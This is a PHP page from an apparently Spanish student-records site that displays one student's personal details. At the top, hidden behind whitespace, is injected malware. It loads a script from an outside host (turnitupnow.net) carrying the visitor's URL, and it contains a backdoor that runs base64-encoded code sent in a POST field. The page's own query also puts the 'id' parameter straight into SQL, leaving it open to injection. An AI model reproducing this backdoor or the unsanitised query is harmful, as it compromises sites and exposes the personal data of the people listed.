<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="resources/estilos.css" rel="stylesheet" type="text/css">

				  <style type="text/css">
<!--
body {
	background-color: #F8F8F8;
}
-->
                  </style>
<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 
include_once("bdd.php");
$id = $_GET['id'];
$result = $db->Execute("SELECT * FROM CDE_alumnos WHERE id = $id LIMIT 0, 1");

	$alumno = $result->fields[1];
	$dni = $result->fields[2];
	$nacimiento = $result->fields[3];
	$direccion = $result->fields[4];
	$poblacion = $result->fields[5];
	$cp = $result->fields[6];
	$provincia = $result->fields[7];
	$telf = $result->fields[8];
	$movil = $result->fields[9];
	$email = $result->fields[10];
	$exp = $result->fields[11];
	$exppro = $result->fields[12];
	$estudios = $result->fields[13];

?>

<table width="500" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="291" height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Datos del Alumno</td>
                    </tr>
                  </table>
				  <table width="500" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                    <tr>
                      <td width="85" height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Alumno</td>
                      <td width="150" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($alumno) ?></label>
                      </strong></td>
                      <td width="92" bgcolor="#F8F8F8" class="texte_mini">&nbsp;DNI</td>
                      <td width="173" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($dni) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Nacimiento</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($nacimiento) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Dirección</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($direccion) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Poblacion</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($poblacion) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;CP</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($cp) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Provincia</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($provincia) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Telf</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($telf) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Movil</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($movil) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Email</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($email) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Experiencia</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($exp) ?></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Exp. Pro</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($exppro) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Estudios</td>
                      <td rowspan="4" valign="top" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($estudios) ?></label>
                      </strong><strong>
                        <label></label>
                      </strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Foto</td>
                      <td rowspan="4" valign="top" bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                    </tr>
                    <tr>
                      <td height="22" bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                    </tr>
                  </table>
				  